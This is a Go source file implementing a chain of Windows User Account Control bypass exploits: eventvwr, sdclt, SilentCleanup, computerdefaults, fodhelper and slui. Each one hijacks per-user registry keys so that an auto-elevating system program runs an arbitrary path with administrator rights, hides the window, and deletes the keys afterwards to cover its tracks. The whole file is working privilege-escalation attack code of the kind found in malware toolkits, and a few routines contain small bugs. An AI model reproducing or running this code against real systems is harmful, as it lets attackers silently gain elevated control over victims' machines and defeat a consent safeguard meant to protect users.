package escalate

import (
	"errors"
	"log"
	"os/exec"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// Escalate bypasses User Account Control of Windows and escaletes
// priviliges to root if User has root priviliges
func Escalate(path string) error {
	log.Println("Path for bypass: (", path, ")")
	version, err := GetVer()
	if err != nil {
		return err
	}
	if version == 10 {
		if computerdefaults(path) == nil {
			log.Println("computerdefaults")
			return nil
		}
		if sdcltcontrol(path) == nil {
			log.Println("sdcltcontrol")
			return nil
		}
		if fodhelper(path) == nil {
			log.Println("fodhelper")
			return nil
		}
	}
	if version > 9 {
		if silentCleanUp(path) == nil {
			log.Println("silentCleanUp")
			return nil
		}
		if slui(path) == nil {
			log.Println("slui")
			return nil
		}
	}
	if version < 10 {
		if eventvwr(path) == nil {
			log.Println("eventvwr")
			return nil
		}
	}
	return errors.New("uac bypass failed")
}

//// TODO: cleanup Exploits

// eventvwr works on 7, 8, 8.1 fixed in win 10
func eventvwr(path string) error {

	log.Println("eventvwr")
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)
	var cmd = exec.Command("eventvwr.exe")
	err = cmd.Run()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
	return nil
}

// sdcltcontrol works on Win 10
func sdcltcontrol(path string) error {

	log.Println("sdcltcontrol")
	var cmd *exec.Cmd

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}

	time.Sleep(2 * time.Second)

	cmd = exec.Command("cmd", "/C", "start sdclt.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`)
	if err != nil {
		return err
	}

	return nil
}

// silentCleanUp works on Win 8.1, 10(patched on some Versions) even on UAC_ALWAYSnotify
func silentCleanUp(path string) error {

	log.Println("silentCleanUp")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}

	err = key.SetStringValue("windir", path)
	if err != nil {
		return err
	}
	err = key.Close()
	if err != nil {
		return err
	}
	time.Sleep(2 * time.Second)
	var cmd = exec.Command("cmd", "/C", "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	delkey, _ := registry.OpenKey(
		registry.CURRENT_USER, `Environment`,
		registry.SET_VALUE)
	delkey.DeleteValue("windir")
	delkey.Close()
	return nil
}

// computerdefaults works on Win 10 is more reliable than fodhelper
func computerdefaults(path string) error {
	log.Println("computerdefaults")
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		return err
	}

	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("cmd", "/C", "start computerdefaults.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return nil
}

// fodhelper works on 10 but computerdefaults is more reliable
func fodhelper(path string) error {
	//
	log.Println("fodhelper")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
		registry.SET_VALUE)
	if err != nil {
		return err
	}
	if err := key.SetStringValue("", path); err != nil {
		return err
	}

	if err := key.SetStringValue("DelegeteExecute", ""); err != nil {
		return err
	}

	if err := key.Close(); err != nil {
		return err
	}
	time.Sleep(2 * time.Second)

	var cmd = exec.Command("start fodhelper.exe")
	err = cmd.Run()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`)
	if err != nil {
		return err
	}
	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
	return nil
}

// slui works on Win 8.1, 10
func slui(path string) error {
	log.Println("slui")

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)

	if err != nil {
		return err
	}
	err = key.SetStringValue("", path)
	if err != nil {
		return err
	}
	err = key.SetStringValue("DelegateExecute", "")
	if err != nil {
		return err
	}
	err = key.Close()
	if err != nil {
		return err
	}

	time.Sleep(2 * time.Second)

	var cmd = exec.Command("slui.exe")
	err = cmd.Run()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\`)
	return nil
}
